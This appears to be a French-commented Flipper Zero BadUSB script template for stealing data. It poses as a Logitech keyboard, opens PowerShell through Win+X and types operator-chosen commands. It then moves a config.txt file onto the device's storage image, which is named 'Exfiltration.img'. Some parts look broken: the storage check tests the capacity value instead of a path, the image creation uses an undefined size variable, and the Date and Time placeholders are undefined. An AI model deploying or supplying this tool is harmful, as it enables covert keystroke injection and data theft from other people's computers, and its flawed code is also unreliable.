// Choississez la capacité souhaité en fonction de vos besoins :
let capacite = X * X * X;

// Choix du layout :
let layout = "XX-XX";

// Ensemble des commandes qui doivent être lancée :
let script = 
[
	"Lignes de commande souhaitée !" 
];

// ___________________________________________________________________________________________________
// Rien à modifier ici
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");
let stockage = "/ext/apps_data/mass_storage/Exfiltration.img";
if (storage.exists(capacite)) { print ("Le stockage existe..."); }
else { print("Creation de l'emplacement de stockage..."); usbdisk.createImage(capacite, size); }
let command = "";
for (let i = 0; i < script.length; i++) { command += script[i]; }
print("Generation du payload...")
badusb.setup({ vid: 0x046D, pid: 0xc33f, mfr_name: "Logitec, Inc",
prod_name: "Keyboard", layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl" });
print("Recherche d'hote...");
while (!badusb.isConnected()) { delay(1000); }
print("Injection du payload");
badusb.press("GUI", "x");
delay(300);
badusb.press("i");
delay(3000);
badusb.println(command, 10);
badusb.press("ENTER");
badusb.println("Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\; Move-Item -Path config.txt -Destination ${DriveLetter}:\\${Date}\\${env:computername}_${Time}.txt; exit")//Find Disk Partition to save
badusb.press("ENTER");
badusb.quit();
delay(2000);
usbdisk.start(stockage);
print("Attendez la fermeture du Terminal...");
while (!usbdisk.wasEjected()) { delay(1000); }
print("Done");
usbdisk.stop();

